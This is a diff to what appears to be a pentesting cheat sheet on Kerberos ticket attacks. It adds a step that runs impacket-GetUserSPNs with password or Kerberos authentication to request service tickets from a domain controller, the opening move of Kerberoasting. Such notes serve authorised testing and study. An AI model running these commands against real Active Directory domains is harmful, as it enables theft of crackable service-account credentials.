@@ -13,6 +13,12 @@ tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Tic
 #### 1. Get Service Principle Name (SPN) \[Optional\]
 
 ```console
+# Password
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
+```
+
+```console
+# Kerberos
 sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
 ```
 
